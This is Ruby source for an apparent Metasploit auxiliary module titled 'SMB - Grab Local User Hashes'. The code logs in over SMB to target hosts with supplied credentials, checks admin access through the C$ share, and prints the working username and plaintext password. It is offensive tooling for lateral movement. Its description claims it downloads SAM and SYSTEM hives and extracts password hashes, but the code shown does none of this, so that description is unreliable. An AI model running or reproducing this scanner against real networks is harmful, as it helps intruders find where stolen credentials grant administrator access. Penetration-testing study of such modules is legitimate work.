##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/exploit/smb/psexec'
require 'rex/registry'
require 'fileutils'
#require 'msf/core/exploit/psexec'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Psexec
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT = Rex::Proto::SMB::Exceptions
	CONST = Rex::Proto::SMB::Constants


	def initialize
		super(
			'Name'        => 'SMB - Grab Local User Hashes',
			'Description' => %Q{
				This module extracts local user account password hashes from the
				SAM and SYSTEM hive files by authenticating to the target machine and
				downloading a copy of the hives.  The hashes are extracted offline on
				the attacking machine.  This all happenes without popping a shell or uploading
				anything to the target machine.  Local Admin credentials (password -or- hash) are required
			},
			'Author'      =>
				[
					'Royce Davis <rdavis[at]accuvant.com>',    # @R3dy__
				],
			'References'  => [
				['URL', 'http://sourceforge.net/projects/smbexec/'],
				['URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access']
			],
			'License'     => MSF_LICENSE
		)
		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store Hive files and hashes', '/tmp/msfhashes/local']),
			OptString.new('RPORT', [true, 'The Target port', 445]),
			OptString.new('WINPATH', [true, 'The name of the WINDOWS directory on the remote host', 'WINDOWS']),
		], self.class)
		deregister_options('RHOST')
	end


	def peer
		return "#{rhost}:#{rport}"
	end


	# This is the main controller function
	def run_host(ip)
		smbshare = datastore['SMBSHARE']
		if connect
			begin
				smb_login
			rescue StandardError => autherror
				vprint_error("#{peer} - #{autherror}")
				return
			end
			if check_admin(ip, smbshare)
				print_good("#{peer} SUCCESS.  User has local admin.  #{datastore['SMBDomain']}\\#{datastore['SMBUser']} #{datastore['SMBPass']} - #{smb_peer_os}")
			end
			disconnect
		end
	end

	def check_admin(host, share)
		begin
			if simple.connect("\\\\#{host}\\#{share}")
				simple.disconnect("\\\\#{host}\\#{share}")
				return true
			end
		rescue StandardError => checkerror
			vprint_error("#{peer} - Host not admin #{checkerror}")
			return false
		end
	end
end
